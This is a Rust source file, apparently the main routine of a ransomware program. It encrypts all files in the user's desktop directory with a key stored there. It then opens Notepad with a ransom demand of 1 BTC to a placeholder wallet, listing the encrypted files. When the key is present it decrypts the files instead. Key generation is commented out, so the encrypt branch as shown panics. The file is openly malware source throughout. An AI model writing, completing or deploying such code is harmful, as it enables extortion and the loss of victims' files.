// #![windows_subsystem = "windows"]

use std::path::Path;

use utils::{
    app_open::open_notepad_with_msg,
    crypter::{crypter_files, fetch_key},
    MalwareResult,
};

#[tokio::main]
async fn main() -> MalwareResult<()> {
    // Key handling
    // The key need be stored in the desktop directory to be easy to the user find it
    let key_path = dirs::desktop_dir().unwrap().join("key_decrypt.key");
    let key_path = Path::new(&key_path);
    
    // this need be runned before the declaration of the key - because the fetch_key generates or loads the key
    // if the key file exists, then decrypt the files else encrypt them
    let encrypt_files = !key_path.exists();

    let key = if key_path.exists() {
        fetch_key(Some(key_path), None)?
    } else {
        // Generate your key to send to the target user to decrypt the files
        // fetch_key(Some(key_path), Some("1234567890"))?
        panic!("Key not found");
    };


    let target_dir_binding = dirs::desktop_dir().unwrap();

    let target_dir = target_dir_binding.to_str().unwrap();

    let mut msg = if encrypt_files {
        vec![
        "Sorry your files are encrypted, to decrypt them you need to pay 1 BTC to the address: FAKE_ADDRESS_WALLET\n",
        "The following files have been encrypted:\n",
        ]
    } else {
        vec![
            "Thanks, your files are decrypted\n",
            "The following files have been decrypted:\n",
        ]
    };

    let files = crypter_files(key, Some(Path::new(&target_dir)), encrypt_files)?;
    let files_used: Vec<&str> = files.iter().map(|str| str.as_str()).collect();

    msg.extend(files_used);

    open_notepad_with_msg(msg);
    Ok(())
}
